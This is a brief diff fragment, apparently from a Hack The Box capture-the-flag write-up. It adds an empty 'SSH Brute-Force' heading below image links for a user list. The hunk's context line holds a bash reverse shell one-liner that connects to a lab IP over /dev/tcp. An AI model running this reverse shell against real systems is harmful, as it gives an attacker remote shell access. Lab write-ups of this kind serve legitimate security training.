@@ -139,3 +139,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/973201b0-4f2b-42e8-95c5-af98ede1c6d2)
 # List of Users
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf5fe75b-fcff-4f91-bbf2-115df6a5d616)
+# SSH Brute-Force
+```CSS
+
+```
